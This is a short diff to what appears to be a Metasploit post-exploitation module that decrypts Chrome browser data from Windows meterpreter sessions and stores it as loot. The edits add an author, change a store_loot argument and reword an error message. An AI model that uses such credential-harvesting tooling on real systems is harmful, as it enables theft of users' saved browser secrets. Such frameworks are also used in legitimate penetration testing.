@@ -27,7 +27,7 @@ class Metasploit3 < Msf::Post
 			'Version'              => '$Revision$',
 			'Platform'             => ['windows'],
 			'SessionTypes'         => ['meterpreter'],
-			'Author'               => ['Sven Taute']
+			'Author'               => ['Sven Taute', 'sinn3r']
 		))
 		register_options(
 			[
@@ -123,7 +123,7 @@ class Metasploit3 < Msf::Post
 		end
 		
 		if secrets != ""
-			path = store_loot("chrome.decrypted", "text/plain", session.tunnel_peer, decrypt_table.to_s, "decrypted_chrome_data.txt", "Decrypted Chrome Data")
+			path = store_loot("chrome.decrypted", "text/plain", session, decrypt_table.to_s, "decrypted_chrome_data.txt", "Decrypted Chrome Data")
 			print_status("Decrypted data saved in: #{path}")
 		end
 	end
@@ -244,7 +244,7 @@ class Metasploit3 < Msf::Post
 		uid = session.sys.config.getuid
 		if is_system?
 			print_status("running as SYSTEM, extracting user list...")
-			print_error("(Automatic decryption will not be possible. You might want to manually migrate, or \"set MIGRATE true\")")
+			print_error("(Automatic decryption will not be possible. You might want to manually migrate, or set \"MIGRATE=true\")")
 			session.fs.dir.foreach(@profiles_path) do |u|
 				usernames << u if u !~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
 			end
